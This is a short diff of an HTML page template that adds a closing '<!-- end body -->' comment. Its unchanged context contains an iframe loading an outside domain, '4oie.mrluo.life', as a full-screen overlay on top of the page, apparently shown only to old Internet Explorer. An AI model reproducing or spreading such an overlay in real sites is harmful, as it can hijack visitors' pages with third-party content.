@@ -32,6 +32,7 @@ var ASSET_URL_PREFIX = {{{ jsonEncode(assetURLPrefix() || '') }}};
 <iframe src="//4oie.mrluo.life/" frameborder="0" scrolling="no" style="position: absolute; left: 0; top: 0; z-index: 99999; width: 100%; height: 100%;"></iframe>
 <![endif]-->
 {{ block('body') }}
+<!-- end body -->
 {{ block('end') }}
 </body>
 </html>
